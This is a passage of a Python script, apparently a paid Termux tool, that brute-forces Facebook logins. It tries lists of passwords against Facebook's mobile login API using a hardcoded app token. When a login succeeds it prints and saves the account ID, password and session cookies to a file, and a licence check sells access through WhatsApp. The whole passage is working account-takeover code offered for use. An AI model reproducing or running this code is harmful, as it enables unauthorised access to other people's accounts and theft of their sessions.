    sys.stdout.write(f"\r{G1}[{A} SMILE-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'amul',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'b-graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{G1}[AJ-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/SMILE-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
def Subscraption():
	sk = "danish"
	lk = "420"
	uuid =str(os.geteuid()) + str(os.getlogin()) 
	id = "".join(uuid+sk+lk)
	Key2 = sk+id
	r1=requests.get("https://github.com/danishhacker420/HKR/blob/main/Approval.txt").text
	if Key2 in r1:
		os.system('clear')
		menu() 
	else:
		os.system("clear")
		print("""\033[38;5;33m
 █████╗ ████████╗ ██████╗ ███╗   ███╗
██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
███████║   ██║   ██║   ██║██╔████╔██║
██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
\033[38;5;196m────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER    \033[38;5;196m : \x1b[38;5;196m SUMON ROY
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m  ABOUTS  \033[38;5;196m  :\x1b[38;5;196m DESTROYED
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m no signal
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
\033[38;5;196m────────────────────────────────────────────""")
		print("\x1b[38;1;97m               NOTES   ")
		
		
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m ATOM TOOLS DAILY UPDATE ")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +ak+ATOM+key1)
		#name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m YOUR NAME : ")
		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'TOKEN KEY =%20%20:%20'+danish+key1
		os.system('am start https://wa.me/+918389066877?text=' + tks)
		Subscraption() 
Subscraption()         
menu()
#__________________[ END ]__________________#




